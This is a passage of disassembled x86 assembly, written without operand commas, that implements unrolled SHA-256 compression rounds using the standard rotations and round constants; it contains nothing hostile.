rol edi 0xa
xor ebx edi
mov edi esi
ror edi 0x2
xor ebx edi
add ebx [ esp + 0x10 ]
mov edi edx
or edi esi
and edi ecx
or edi ebp
add edi ebx
mov [ esp + 0x18 ] edi
mov edi eax
ror edi 0xb
mov ebx eax
rol ebx 0x7
xor edi ebx
mov ebx eax
ror ebx 0x6
xor edi ebx
mov ebx [ esp + 0x20 ]
xor ebx [ esp + 0x2c ]
and ebx eax
xor ebx [ esp + 0x20 ]
add edi [ esp + 0x14 ]
add ebx edi
mov edi [ esp + 0x68 ]
lea edi [ ebx + edi - 0x7f214e02 ]
add ecx edi
mov [ esp + 0x10 ] edi
mov edi [ esp + 0x18 ]
mov ebp edi
ror ebp 0xd
mov ebx edi
rol ebx 0xa
xor ebp ebx
mov ebx edi
ror ebx 0x2
xor ebp ebx
add ebp [ esp + 0x10 ]
mov ebx esi
or ebx edi
and ebx edx
mov [ esp + 0x1c ] ebx
mov ebx esi
and ebx edi
mov edi [ esp + 0x1c ]
or edi ebx
add edi ebp
mov [ esp + 0x14 ] edi
mov ebx ecx
ror ebx 0xb
mov edi ecx
rol edi 0x7
xor ebx edi
mov edi ecx
ror edi 0x6
xor ebx edi
add ebx [ esp + 0x20 ]
mov edi [ esp + 0x2c ]
mov ebp eax
xor ebp edi
and ebp ecx
xor ebp edi
mov edi [ esp + 0x6c ]
add ebp ebx
lea edi [ edi + ebp - 0x6423f959 ]
add edx edi
mov [ esp + 0x10 ] edi
mov edi [ esp + 0x14 ]
mov ebp edi
mov ebx edi
ror ebp 0xd
rol ebx 0xa
xor ebp ebx
mov ebx edi
ror ebx 0x2
xor ebp ebx
mov ebx [ esp + 0x18 ]
add ebp [ esp + 0x10 ]
or ebx edi
and ebx esi
mov [ esp + 0x1c ] ebx
mov ebx [ esp + 0x18 ]
and ebx edi
mov edi [ esp + 0x1c ]
or edi ebx
add edi ebp
mov [ esp + 0x20 ] edi
mov edi edx
ror edi 0xb
mov ebx edx
rol ebx 0x7
xor edi ebx
mov ebx edx
ror ebx 0x6
xor edi ebx
add edi [ esp + 0x2c ]
mov ebx eax
xor ebx ecx
and ebx edx
xor ebx eax
add ebx edi
mov edi [ esp + 0x70 ]
lea edi [ ebx + edi - 0x3e640e8c ]
add esi edi
mov [ esp + 0x10 ] edi
mov edi [ esp + 0x20 ]
mov ebp edi
ror ebp 0xd
mov ebx edi
rol ebx 0xa
xor ebp ebx
mov ebx edi
ror ebx 0x2
xor ebp ebx
add ebp [ esp + 0x10 ]
mov ebx [ esp + 0x14 ]
or ebx edi
and ebx [ esp + 0x18 ]
mov [ esp + 0x1c ] ebx
mov ebx [ esp + 0x14 ]
and ebx edi
mov edi [ esp + 0x1c ]
or edi ebx
add edi ebp
mov [ esp + 0x2c ] edi
mov edi [ esp + 0x6c ]
mov ebp edi
rol ebp 0xf
mov ebx edi
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0x38 ]
shr edi 0xa
xor ebp edi
add ebp [ esp + 0x58 ]
mov edi ebx
rol edi 0xe
ror ebx 0x7
xor edi ebx
mov ebx [ esp + 0x38 ]
shr ebx 0x3
xor edi ebx
add edi ebp
add edi [ esp + 0x34 ]
mov ebx esi
ror ebx 0xb
mov ebp esi
rol ebp 0x7
xor ebx ebp
mov ebp esi
ror ebp 0x6
xor ebx ebp
add ebx edi
mov ebp ecx
xor ebp edx
and ebp esi
xor ebp ecx
add ebp ebx
mov ebx [ esp + 0x20 ]
lea eax [ eax + ebp - 0x1b64963f ]
add [ esp + 0x18 ] eax
mov [ esp + 0x74 ] edi
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x2c ]
mov ebp eax
ror ebp 0xd
mov edi eax
rol edi 0xa
xor ebp edi
mov edi eax
ror edi 0x2
xor ebp edi
add ebp [ esp + 0x10 ]
mov edi ebx
or edi eax
and edi [ esp + 0x14 ]
and ebx eax
mov eax [ esp + 0x70 ]
or edi ebx
add edi ebp
mov ebp eax
rol ebp 0xf
mov ebx eax
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0x3c ]
shr eax 0xa
xor ebp eax
add ebp [ esp + 0x5c ]
mov eax ebx
rol eax 0xe
ror ebx 0x7
xor eax ebx
mov ebx [ esp + 0x3c ]
shr ebx 0x3
xor eax ebx
add eax ebp
add eax [ esp + 0x38 ]
mov [ esp + 0x78 ] eax
mov eax [ esp + 0x18 ]
mov ebx eax
ror ebx 0xb
mov ebp eax
rol ebp 0x7
xor ebx ebp
mov ebp eax
ror ebp 0x6
xor ebx ebp
add ebx [ esp + 0x78 ]
mov ebp edx
xor ebp esi
and ebp eax
xor ebp edx
add ebp ebx
lea ecx [ ecx + ebp - 0x1041b87a ]
add [ esp + 0x14 ] ecx
mov [ esp + 0x10 ] ecx
mov ebx edi
ror ebx 0xd
mov eax edi
rol eax 0xa
xor ebx eax
mov ecx edi
ror ecx 0x2
xor ebx ecx
add ebx [ esp + 0x10 ]
mov ecx [ esp + 0x2c ]
mov eax edi
or eax ecx
and eax [ esp + 0x20 ]
mov ebp edi
and ebp ecx
mov ecx [ esp + 0x74 ]
or eax ebp
add eax ebx
mov ebp ecx
mov ebx ecx
rol ebp 0xf
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0x40 ]
shr ecx 0xa
xor ebp ecx
add ebp [ esp + 0x60 ]
mov ecx ebx
rol ecx 0xe
ror ebx 0x7
xor ecx ebx
mov ebx [ esp + 0x40 ]
shr ebx 0x3
xor ecx ebx
add ecx ebp
add ecx [ esp + 0x3c ]
mov [ esp + 0x7c ] ecx
mov ecx [ esp + 0x14 ]
mov ebx ecx
ror ebx 0xb
mov ebp ecx
rol ebp 0x7
xor ebx ebp
ror ecx 0x6
xor ebx ecx
mov ecx esi
xor ecx [ esp + 0x18 ]
add ebx [ esp + 0x7c ]
and ecx [ esp + 0x14 ]
mov ebp edi
xor ecx esi
add ecx ebx
lea edx [ ecx + edx + 0xfc19dc6 ]
add [ esp + 0x20 ] edx
and ebp eax
mov ebx eax
ror ebx 0xd
mov ecx eax
rol ecx 0xa
xor ebx ecx
mov ecx eax
ror ecx 0x2
xor ebx ecx
add ebx edx
mov edx [ esp + 0x78 ]
mov ecx edi
or ecx eax
and ecx [ esp + 0x2c ]
or ecx ebp
add ecx ebx
mov ebp edx
mov ebx edx
shr edx 0xa
rol ebp 0xf
rol ebx 0xd
xor ebp ebx
xor ebp edx
add ebp [ esp + 0x64 ]
mov ebx [ esp + 0x44 ]
mov edx ebx
rol edx 0xe
ror ebx 0x7
xor edx ebx
mov ebx [ esp + 0x44 ]
shr ebx 0x3
xor edx ebx
add edx ebp
add edx [ esp + 0x40 ]
mov [ esp + 0x80 ] edx
mov edx [ esp + 0x20 ]
mov ebx edx
mov ebp edx
ror ebx 0xb
rol ebp 0x7
xor ebx ebp
ror edx 0x6
xor ebx edx
add ebx [ esp + 0x80 ]
mov edx [ esp + 0x18 ]
xor edx [ esp + 0x14 ]
mov ebp eax
and edx [ esp + 0x20 ]
and ebp ecx
xor edx [ esp + 0x18 ]
add edx ebx
lea esi [ edx + esi + 0x240ca1cc ]
add [ esp + 0x2c ] esi
mov ebx ecx
ror ebx 0xd
mov edx ecx
rol edx 0xa
xor ebx edx
mov edx ecx
ror edx 0x2
xor ebx edx
mov edx eax
or edx ecx
and edx edi
add ebx esi
mov esi [ esp + 0x7c ]
or edx ebp
add edx ebx
mov ebp esi
rol ebp 0xf
mov ebx esi
rol ebx 0xd
xor ebp ebx
shr esi 0xa
xor ebp esi
add ebp [ esp + 0x68 ]
mov ebx [ esp + 0x48 ]
mov esi ebx
rol esi 0xe
ror ebx 0x7
xor esi ebx
mov ebx [ esp + 0x48 ]
shr ebx 0x3
xor esi ebx
add esi ebp
add esi [ esp + 0x44 ]
mov [ esp + 0x84 ] esi
mov esi [ esp + 0x2c ]
mov ebx esi
ror ebx 0xb
mov ebp esi
rol ebp 0x7
xor ebx ebp
ror esi 0x6
xor ebx esi
add ebx [ esp + 0x84 ]
mov esi [ esp + 0x14 ]
xor esi [ esp + 0x20 ]
mov ebp ecx
and esi [ esp + 0x2c ]
and ebp edx
xor esi [ esp + 0x14 ]
add esi ebx
mov ebx [ esp + 0x18 ]
lea esi [ esi + ebx + 0x2de92c6f ]
add edi esi
mov [ esp + 0x10 ] esi
mov ebx edx
ror ebx 0xd
mov esi edx
rol esi 0xa
xor ebx esi
mov esi edx
ror esi 0x2
xor ebx esi
add ebx [ esp + 0x10 ]
mov esi ecx
or esi edx
and esi eax
or esi ebp
add esi ebx
mov [ esp + 0x18 ] esi
mov esi [ esp + 0x80 ]
mov ebp esi
mov ebx esi
shr esi 0xa
rol ebp 0xf
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0x4c ]
xor ebp esi
add ebp [ esp + 0x6c ]
mov esi ebx
rol esi 0xe
ror ebx 0x7
xor esi ebx
mov ebx [ esp + 0x4c ]
shr ebx 0x3
xor esi ebx
add esi ebp
add esi [ esp + 0x48 ]
mov ebx edi
mov [ esp + 0x88 ] esi
mov esi edi
ror esi 0xb
rol ebx 0x7
xor esi ebx
mov ebx edi
ror ebx 0x6
xor esi ebx
mov ebx [ esp + 0x20 ]
xor ebx [ esp + 0x2c ]
and ebx edi
xor ebx [ esp + 0x20 ]
add esi [ esp + 0x88 ]
add ebx esi
mov esi [ esp + 0x14 ]
lea esi [ ebx + esi + 0x4a7484aa ]
add eax esi
mov [ esp + 0x10 ] esi
mov esi [ esp + 0x18 ]
mov ebp esi
ror ebp 0xd
mov ebx esi
rol ebx 0xa
xor ebp ebx
mov ebx esi
ror ebx 0x2
xor ebp ebx
add ebp [ esp + 0x10 ]
mov ebx edx
or ebx esi
and ebx ecx
mov [ esp + 0x1c ] ebx
mov ebx edx
and ebx esi
mov esi [ esp + 0x1c ]
or esi ebx
add esi ebp
mov [ esp + 0x14 ] esi
mov esi [ esp + 0x84 ]
mov ebp esi
rol ebp 0xf
mov ebx esi
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0x50 ]
shr esi 0xa
xor ebp esi
add ebp [ esp + 0x70 ]
mov esi ebx
rol esi 0xe
ror ebx 0x7
xor esi ebx
mov ebx [ esp + 0x50 ]
shr ebx 0x3
xor esi ebx
add esi ebp
add esi [ esp + 0x4c ]
mov ebx eax
ror ebx 0xb
mov [ esp + 0x8c ] esi
mov esi eax
rol esi 0x7
xor ebx esi
mov esi eax
ror esi 0x6
xor ebx esi
add ebx [ esp + 0x8c ]
mov esi [ esp + 0x2c ]
mov ebp edi
xor ebp esi
and ebp eax
xor ebp esi
mov esi [ esp + 0x20 ]
add ebp ebx
lea esi [ esi + ebp + 0x5cb0a9dc ]
add ecx esi
mov [ esp + 0x10 ] esi
mov esi [ esp + 0x14 ]
mov ebp esi
ror ebp 0xd
mov ebx esi
rol ebx 0xa
xor ebp ebx
mov ebx esi
ror ebx 0x2
xor ebp ebx
mov ebx [ esp + 0x18 ]
or ebx esi
and ebx edx
mov [ esp + 0x1c ] ebx
mov ebx [ esp + 0x18 ]
and ebx esi
mov esi [ esp + 0x1c ]
or esi ebx
add ebp [ esp + 0x10 ]
add esi ebp
mov [ esp + 0x20 ] esi
mov esi [ esp + 0x88 ]
mov ebp esi
rol ebp 0xf
mov ebx esi
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0x54 ]
shr esi 0xa
xor ebp esi
add ebp [ esp + 0x74 ]
mov esi ebx
rol esi 0xe
ror ebx 0x7
xor esi ebx
mov ebx [ esp + 0x54 ]
shr ebx 0x3
xor esi ebx
add esi ebp
add esi [ esp + 0x50 ]
mov ebx ecx
ror ebx 0xb
mov ebp ecx
rol ebp 0x7
xor ebx ebp
mov [ esp + 0x90 ] esi
mov ebp ecx
ror ebp 0x6
xor ebx ebp
add ebx esi
mov esi [ esp + 0x2c ]
mov ebp edi
xor ebp eax
and ebp ecx
xor ebp edi
add ebp ebx
lea esi [ esi + ebp + 0x76f988da ]
add edx esi
mov [ esp + 0x10 ] esi
mov esi [ esp + 0x20 ]
mov ebp esi
ror ebp 0xd
mov ebx esi
rol ebx 0xa
xor ebp ebx
mov ebx esi
ror ebx 0x2
xor ebp ebx
mov ebx [ esp + 0x14 ]
add ebp [ esp + 0x10 ]
or ebx esi
and ebx [ esp + 0x18 ]
mov [ esp + 0x1c ] ebx
mov ebx [ esp + 0x14 ]
and ebx esi
mov esi [ esp + 0x1c ]
or esi ebx
add esi ebp
mov [ esp + 0x2c ] esi
mov esi [ esp + 0x8c ]
mov ebp esi
mov ebx esi
rol ebp 0xf
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0x58 ]
shr esi 0xa
xor ebp esi
add ebp [ esp + 0x78 ]
mov esi ebx
rol esi 0xe
ror ebx 0x7
xor esi ebx
mov ebx [ esp + 0x58 ]
shr ebx 0x3
xor esi ebx
add esi ebp
add esi [ esp + 0x54 ]
mov [ esp + 0x94 ] esi
mov ebx edx
ror ebx 0xb
mov ebp edx
rol ebp 0x7
xor ebx ebp
mov ebp edx
ror ebp 0x6
xor ebx ebp
add ebx esi
mov esi [ esp + 0x2c ]
mov ebp eax
xor ebp ecx
and ebp edx
xor ebp eax
add ebp ebx
lea edi [ edi + ebp - 0x67c1aeae ]
add [ esp + 0x18 ] edi
mov [ esp + 0x10 ] edi
mov ebp [ esp + 0x20 ]
and ebp esi
mov ebx esi
ror ebx 0xd
mov edi esi
rol edi 0xa
xor ebx edi
mov edi esi
ror edi 0x2
xor ebx edi
add ebx [ esp + 0x10 ]
mov edi [ esp + 0x20 ]
or edi esi
and edi [ esp + 0x14 ]
or edi ebp
add edi ebx
mov [ esp + 0x1c ] edi
mov edi [ esp + 0x90 ]
mov ebp edi
rol ebp 0xf
mov ebx edi
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0x5c ]
shr edi 0xa
xor ebp edi
add ebp [ esp + 0x7c ]
mov edi ebx
rol edi 0xe
ror ebx 0x7
xor edi ebx
mov ebx [ esp + 0x5c ]
shr ebx 0x3
xor edi ebx
add edi ebp
add edi [ esp + 0x58 ]
mov [ esp + 0x98 ] edi
mov edi [ esp + 0x18 ]
mov ebx edi
ror ebx 0xb
mov ebp edi
rol ebp 0x7
xor ebx ebp
mov ebp edi
ror ebp 0x6
xor ebx ebp
add ebx [ esp + 0x98 ]
mov ebp ecx
xor ebp edx
and ebp edi
mov edi [ esp + 0x1c ]
xor ebp ecx
add ebp ebx
lea eax [ eax + ebp - 0x57ce3993 ]
add [ esp + 0x14 ] eax
mov [ esp + 0x10 ] eax
mov ebx edi
ror ebx 0xd
mov eax edi
rol eax 0xa
xor ebx eax
mov eax edi
ror eax 0x2
xor ebx eax
add ebx [ esp + 0x10 ]
mov eax edi
or eax esi
and eax [ esp + 0x20 ]
mov ebp edi
and ebp esi
or eax ebp
add eax ebx
mov [ esp + 0x30 ] eax
mov eax [ esp + 0x94 ]
mov ebp eax
rol ebp 0xf
mov ebx eax
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0x60 ]
shr eax 0xa
xor ebp eax
add ebp [ esp + 0x80 ]
mov eax ebx
rol eax 0xe
ror ebx 0x7
xor eax ebx
mov ebx [ esp + 0x60 ]
shr ebx 0x3
xor eax ebx
add eax ebp
add eax [ esp + 0x5c ]
mov [ esp + 0x9c ] eax
mov eax [ esp + 0x14 ]
mov ebx eax
ror ebx 0xb
mov ebp eax
rol ebp 0x7
xor ebx ebp
ror eax 0x6
xor ebx eax
add ebx [ esp + 0x9c ]
mov eax edx
xor eax [ esp + 0x18 ]
mov ebp edi
and eax [ esp + 0x14 ]
xor eax edx
add eax ebx
lea ecx [ eax + ecx - 0x4ffcd838 ]
add [ esp + 0x20 ] ecx
mov eax [ esp + 0x30 ]
mov [ esp + 0x10 ] ecx
mov ebx eax
ror ebx 0xd
mov ecx eax
rol ecx 0xa
xor ebx ecx
mov ecx eax
ror ecx 0x2
xor ebx ecx
add ebx [ esp + 0x10 ]
and ebp eax
mov ecx edi
or ecx eax
and ecx esi
or ecx ebp
add ecx ebx
mov [ esp + 0x24 ] ecx
mov ecx [ esp + 0x98 ]
mov ebp ecx
mov ebx ecx
rol ebp 0xf
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0x64 ]
shr ecx 0xa
xor ebp ecx
mov ecx ebx
rol ecx 0xe
ror ebx 0x7
xor ecx ebx
mov ebx [ esp + 0x64 ]
shr ebx 0x3
xor ecx ebx
add ebp [ esp + 0x84 ]
add ecx ebp
add ecx [ esp + 0x60 ]
mov [ esp + 0xa0 ] ecx
mov ecx [ esp + 0x20 ]
mov ebx ecx
ror ebx 0xb
mov ebp ecx
rol ebp 0x7
xor ebx ebp
ror ecx 0x6
xor ebx ecx
add ebx [ esp + 0xa0 ]
mov ecx [ esp + 0x18 ]
xor ecx [ esp + 0x14 ]
mov ebp eax
and ecx [ esp + 0x20 ]
xor ecx [ esp + 0x18 ]
add ecx ebx
lea edx [ ecx + edx - 0x40a68039 ]
mov ecx [ esp + 0x24 ]
add esi edx
mov [ esp + 0x10 ] edx
mov ebx ecx
ror ebx 0xd
mov edx ecx
rol edx 0xa
xor ebx edx
and ebp ecx
mov edx ecx
ror edx 0x2
xor ebx edx
add ebx [ esp + 0x10 ]
mov edx eax
or edx ecx
and edx edi
or edx ebp
add edx ebx
mov [ esp + 0x28 ] edx
mov edx [ esp + 0x9c ]
mov ebp edx
mov ebx edx
shr edx 0xa
rol ebp 0xf
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0x68 ]
xor ebp edx
add ebp [ esp + 0x88 ]
mov edx ebx
rol edx 0xe
ror ebx 0x7
xor edx ebx
mov ebx [ esp + 0x68 ]
shr ebx 0x3
xor edx ebx
add edx ebp
add edx [ esp + 0x64 ]
mov ebx esi
mov [ esp + 0xa4 ] edx
mov edx esi
ror edx 0xb
rol ebx 0x7
xor edx ebx
mov ebx esi
ror ebx 0x6
xor edx ebx
mov ebx [ esp + 0x14 ]
xor ebx [ esp + 0x20 ]
add edx [ esp + 0xa4 ]
and ebx esi
xor ebx [ esp + 0x14 ]
add ebx edx
mov edx [ esp + 0x18 ]
lea edx [ ebx + edx - 0x391ff40d ]
add edi edx
mov [ esp + 0x10 ] edx
mov edx [ esp + 0x28 ]
mov ebp edx
ror ebp 0xd
mov ebx edx
rol ebx 0xa
xor ebp ebx
mov ebx edx
ror ebx 0x2
xor ebp ebx
add ebp [ esp + 0x10 ]
mov ebx ecx
or ebx edx
and ebx eax
mov [ esp + 0x1c ] ebx
mov ebx ecx
and ebx edx
mov edx [ esp + 0x1c ]
or edx ebx
add edx ebp
mov [ esp + 0x18 ] edx
mov edx [ esp + 0xa0 ]
mov ebp edx
rol ebp 0xf
mov ebx edx
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0x6c ]
shr edx 0xa
xor ebp edx
add ebp [ esp + 0x8c ]
mov edx ebx
rol edx 0xe
ror ebx 0x7
xor edx ebx
mov ebx [ esp + 0x6c ]
shr ebx 0x3
xor edx ebx
add edx ebp
add edx [ esp + 0x68 ]
mov ebx edi
ror ebx 0xb
mov [ esp + 0xa8 ] edx
mov edx edi
rol edx 0x7
xor ebx edx
mov edx edi
ror edx 0x6
xor ebx edx
add ebx [ esp + 0xa8 ]
mov edx [ esp + 0x20 ]
mov ebp edx
xor ebp esi
and ebp edi
xor ebp edx
mov edx [ esp + 0x14 ]
add ebp ebx
lea edx [ edx + ebp - 0x2a586eb9 ]
add eax edx
mov [ esp + 0x10 ] edx
mov edx [ esp + 0x18 ]
mov ebp edx
ror ebp 0xd
mov ebx edx
rol ebx 0xa
xor ebp ebx
mov ebx edx
ror ebx 0x2
xor ebp ebx
mov ebx [ esp + 0x28 ]
add ebp [ esp + 0x10 ]
or ebx edx
and ebx ecx
mov [ esp + 0x1c ] ebx
mov ebx [ esp + 0x28 ]
and ebx edx
mov edx [ esp + 0x1c ]
or edx ebx
add edx ebp
mov [ esp + 0x14 ] edx
mov edx [ esp + 0xa4 ]
mov ebp edx
rol ebp 0xf
mov ebx edx
rol ebx 0xd
xor ebp ebx
shr edx 0xa
xor ebp edx
add ebp [ esp + 0x90 ]
mov ebx [ esp + 0x70 ]
mov edx ebx
rol edx 0xe
ror ebx 0x7
xor edx ebx
mov ebx [ esp + 0x70 ]
shr ebx 0x3
xor edx ebx
add edx ebp
add edx [ esp + 0x6c ]
mov ebx eax
ror ebx 0xb
mov ebp eax
rol ebp 0x7
xor ebx ebp
mov [ esp + 0xac ] edx
mov ebp eax
ror ebp 0x6
xor ebx ebp
add ebx edx
mov edx [ esp + 0x20 ]
mov ebp edi
xor ebp esi
and ebp eax
xor ebp esi
add ebp ebx
lea edx [ edx + ebp + 0x6ca6351 ]
add ecx edx
mov [ esp + 0x10 ] edx
mov edx [ esp + 0x14 ]
mov ebp edx
ror ebp 0xd
mov ebx edx
rol ebx 0xa
xor ebp ebx
mov ebx edx
ror ebx 0x2
xor ebp ebx
add ebp [ esp + 0x10 ]
mov ebx [ esp + 0x18 ]
or ebx edx
and ebx [ esp + 0x28 ]
mov [ esp + 0x1c ] ebx
mov ebx [ esp + 0x18 ]
and ebx edx
mov edx [ esp + 0x1c ]
or edx ebx
add edx ebp
mov [ esp + 0x20 ] edx
mov edx [ esp + 0xa8 ]
mov ebp edx
rol ebp 0xf
mov ebx edx
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0x74 ]
shr edx 0xa
xor ebp edx
add ebp [ esp + 0x94 ]
mov edx ebx
rol edx 0xe
ror ebx 0x7
xor edx ebx
mov ebx [ esp + 0x74 ]
shr ebx 0x3
xor edx ebx
add edx ebp
add edx [ esp + 0x70 ]
mov ebx ecx
ror ebx 0xb
mov ebp ecx
rol ebp 0x7
xor ebx ebp
mov ebp ecx
ror ebp 0x6
xor ebx ebp
mov [ esp + 0xb0 ] edx
mov ebp edi
xor ebp eax
and ebp ecx
xor ebp edi
add ebx edx
add ebp ebx
lea esi [ esi + ebp + 0x14292967 ]
add [ esp + 0x28 ] esi
mov edx [ esp + 0x20 ]
mov [ esp + 0x10 ] esi
mov ebp [ esp + 0x14 ]
and ebp edx
mov ebx edx
ror ebx 0xd
mov esi edx
rol esi 0xa
xor ebx esi
mov esi edx
ror esi 0x2
xor ebx esi
add ebx [ esp + 0x10 ]
mov esi [ esp + 0x14 ]
or esi edx
and esi [ esp + 0x18 ]
or esi ebp
add esi ebx
mov [ esp + 0x2c ] esi
mov esi [ esp + 0xac ]
mov ebp esi
rol ebp 0xf
mov ebx esi
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0x78 ]
shr esi 0xa
xor ebp esi
add ebp [ esp + 0x98 ]
mov esi ebx
rol esi 0xe
ror ebx 0x7
xor esi ebx
mov ebx [ esp + 0x78 ]
shr ebx 0x3
xor esi ebx
add esi ebp
add esi [ esp + 0x74 ]
mov [ esp + 0xb4 ] esi
mov esi [ esp + 0x28 ]
mov ebx esi
ror ebx 0xb
mov ebp esi
rol ebp 0x7
xor ebx ebp
mov ebp esi
ror ebp 0x6
xor ebx ebp
add ebx [ esp + 0xb4 ]
mov ebp eax
xor ebp ecx
and ebp esi
mov esi [ esp + 0x2c ]
xor ebp eax
add ebp ebx
lea edi [ edi + ebp + 0x27b70a85 ]
add [ esp + 0x18 ] edi
mov [ esp + 0x10 ] edi
mov ebx esi
ror ebx 0xd
mov edi esi
rol edi 0xa
xor ebx edi
mov edi esi
ror edi 0x2
xor ebx edi
add ebx [ esp + 0x10 ]
mov edi edx
or edi esi
and edi [ esp + 0x14 ]
mov ebp edx
and ebp esi
or edi ebp
add edi ebx
mov [ esp + 0x1c ] edi
mov edi [ esp + 0xb0 ]
mov ebp edi
rol ebp 0xf
mov ebx edi
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0x7c ]
shr edi 0xa
xor ebp edi
add ebp [ esp + 0x9c ]
mov edi ebx
rol edi 0xe
ror ebx 0x7
xor edi ebx
mov ebx [ esp + 0x7c ]
shr ebx 0x3
xor edi ebx
add edi ebp
add edi [ esp + 0x78 ]
mov [ esp + 0xb8 ] edi
mov edi [ esp + 0x18 ]
mov ebx edi
ror ebx 0xb
mov ebp edi
rol ebp 0x7
xor ebx ebp
ror edi 0x6
xor ebx edi
add ebx [ esp + 0xb8 ]
mov edi ecx
xor edi [ esp + 0x28 ]
and edi [ esp + 0x18 ]
xor edi ecx
add edi ebx
lea eax [ edi + eax + 0x2e1b2138 ]
add [ esp + 0x14 ] eax
mov edi [ esp + 0x1c ]
mov [ esp + 0x10 ] eax
mov ebx edi
ror ebx 0xd
mov eax edi
rol eax 0xa
xor ebx eax
mov eax edi
ror eax 0x2
xor ebx eax
add ebx [ esp + 0x10 ]
mov eax edi
or eax esi
and eax edx
mov ebp edi
and ebp esi
or eax ebp
add eax ebx
mov [ esp + 0x30 ] eax
mov eax [ esp + 0xb4 ]
mov ebp eax
mov ebx eax
rol ebp 0xf
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0x80 ]
shr eax 0xa
xor ebp eax
add ebp [ esp + 0xa0 ]
mov eax ebx
rol eax 0xe
ror ebx 0x7
xor eax ebx
mov ebx [ esp + 0x80 ]
shr ebx 0x3
xor eax ebx
add eax ebp
add eax [ esp + 0x7c ]
mov [ esp + 0xbc ] eax
mov eax [ esp + 0x14 ]
mov ebx eax
mov ebp eax
ror ebx 0xb
rol ebp 0x7
xor ebx ebp
ror eax 0x6
xor ebx eax
add ebx [ esp + 0xbc ]
mov eax [ esp + 0x28 ]
xor eax [ esp + 0x18 ]
mov ebp edi
and eax [ esp + 0x14 ]
xor eax [ esp + 0x28 ]
add eax ebx
lea ecx [ eax + ecx + 0x4d2c6dfc ]
mov eax [ esp + 0x30 ]
add edx ecx
mov [ esp + 0x10 ] ecx
and ebp eax
mov ebx eax
ror ebx 0xd
mov ecx eax
rol ecx 0xa
xor ebx ecx
mov ecx eax
ror ecx 0x2
xor ebx ecx
add ebx [ esp + 0x10 ]
mov ecx edi
or ecx eax
and ecx esi
or ecx ebp
add ecx ebx
mov [ esp + 0x24 ] ecx
mov ecx [ esp + 0x84 ]
mov ebp ecx
mov ebx ecx
shr ecx 0x3
rol ebp 0xe
ror ebx 0x7
xor ebp ebx
mov ebx [ esp + 0xb8 ]
xor ebp ecx
add ebp [ esp + 0xa4 ]
mov ecx ebx
rol ecx 0xf
rol ebx 0xd
xor ecx ebx
mov ebx [ esp + 0xb8 ]
shr ebx 0xa
xor ecx ebx
add ecx ebp
add ecx [ esp + 0x80 ]
mov ebx edx
mov [ esp + 0xc0 ] ecx
mov ecx edx
ror ecx 0xb
rol ebx 0x7
xor ecx ebx
mov ebx edx
ror ebx 0x6
xor ecx ebx
mov ebx [ esp + 0x18 ]
xor ebx [ esp + 0x14 ]
add ecx [ esp + 0xc0 ]
and ebx edx
xor ebx [ esp + 0x18 ]
add ebx ecx
mov ecx [ esp + 0x28 ]
lea ecx [ ebx + ecx + 0x53380d13 ]
add esi ecx
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0x24 ]
mov ebp ecx
ror ebp 0xd
mov ebx ecx
rol ebx 0xa
xor ebp ebx
mov ebx ecx
ror ebx 0x2
xor ebp ebx
mov ebx eax
or ebx ecx
and ebx edi
mov [ esp + 0x1c ] ebx
add ebp [ esp + 0x10 ]
mov ebx eax
and ebx ecx
mov ecx [ esp + 0x1c ]
or ecx ebx
add ecx ebp
mov [ esp + 0x28 ] ecx
mov ecx [ esp + 0x88 ]
mov ebp ecx
rol ebp 0xe
mov ebx ecx
ror ebx 0x7
xor ebp ebx
mov ebx [ esp + 0xbc ]
shr ecx 0x3
xor ebp ecx
add ebp [ esp + 0xa8 ]
mov ecx ebx
rol ecx 0xf
rol ebx 0xd
xor ecx ebx
mov ebx [ esp + 0xbc ]
shr ebx 0xa
xor ecx ebx
add ecx ebp
add ecx [ esp + 0x84 ]
mov ebx esi
ror ebx 0xb
mov [ esp + 0xc4 ] ecx
mov ecx esi
rol ecx 0x7
xor ebx ecx
mov ecx esi
ror ecx 0x6
xor ebx ecx
add ebx [ esp + 0xc4 ]
mov ecx [ esp + 0x14 ]
mov ebp ecx
xor ebp edx
and ebp esi
xor ebp ecx
mov ecx [ esp + 0x18 ]
add ebp ebx
lea ecx [ ecx + ebp + 0x650a7354 ]
add edi ecx
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0x28 ]
mov ebp ecx
ror ebp 0xd
mov ebx ecx
rol ebx 0xa
xor ebp ebx
mov ebx ecx
ror ebx 0x2
xor ebp ebx
mov ebx [ esp + 0x24 ]
add ebp [ esp + 0x10 ]
or ebx ecx
and ebx eax
mov [ esp + 0x1c ] ebx
mov ebx [ esp + 0x24 ]
and ebx ecx
mov ecx [ esp + 0x1c ]
or ecx ebx
add ecx ebp
mov [ esp + 0x18 ] ecx
mov ecx [ esp + 0x8c ]
mov ebp ecx
rol ebp 0xe
mov ebx ecx
ror ebx 0x7
xor ebp ebx
mov ebx [ esp + 0xc0 ]
shr ecx 0x3
xor ebp ecx
mov ecx ebx
rol ecx 0xf
rol ebx 0xd
xor ecx ebx
mov ebx [ esp + 0xc0 ]
shr ebx 0xa
add ebp [ esp + 0xac ]
xor ecx ebx
add ecx ebp
add ecx [ esp + 0x88 ]
mov ebx edi
ror ebx 0xb
mov ebp edi
rol ebp 0x7
xor ebx ebp
mov [ esp + 0xc8 ] ecx
mov ebp edi
ror ebp 0x6
xor ebx ebp
add ebx ecx
mov ecx [ esp + 0x14 ]
mov ebp edx
xor ebp esi
and ebp edi
xor ebp edx
add ebp ebx
lea ecx [ ecx + ebp + 0x766a0abb ]
add eax ecx
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0x18 ]
mov ebp ecx
ror ebp 0xd
mov ebx ecx
rol ebx 0xa
